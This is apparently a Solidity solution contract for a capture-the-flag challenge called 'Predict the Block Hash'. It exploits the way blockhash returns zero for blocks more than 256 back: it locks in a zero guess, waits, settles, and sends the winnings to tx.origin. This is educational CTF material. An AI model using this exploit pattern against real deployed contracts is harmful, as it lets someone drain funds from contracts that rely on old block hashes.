pragma solidity ^0.8.13;

interface IPredictTheBlockHashChallenge {
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheBlockHashAttacker {
    IPredictTheBlockHashChallenge levelInstance;
    
    // It will be also implicitly initialized as zero if no value is assigned.
    bytes32 public emptyBytes32 = bytes32(0); 

    uint256 lockingBlockNumber;
    uint16 public constant MAX_SAVESPAN = 256;

    constructor(address _levelInstance) {
        levelInstance = IPredictTheBlockHashChallenge(_levelInstance);
    }

    function lockGuess() external payable {
        levelInstance.lockInGuess{value: 1 ether}(emptyBytes32);
        lockingBlockNumber = block.number;
    }

    function remainingBlocks() external view returns(uint256){
        return MAX_SAVESPAN - (block.number - lockingBlockNumber);
    }

    function attack() external {
        require(block.number >= lockingBlockNumber + MAX_SAVESPAN, "Wait until 256 block passed");
        levelInstance.settle();

        require(levelInstance.isComplete(), "!completed");

                // Transfer back all the funds to the user
        (bool withdrawn, ) = payable(tx.origin).call{value: address(this).balance}("");
        require(withdrawn,  "!withdrawn");
    }
    receive() external payable {}
}
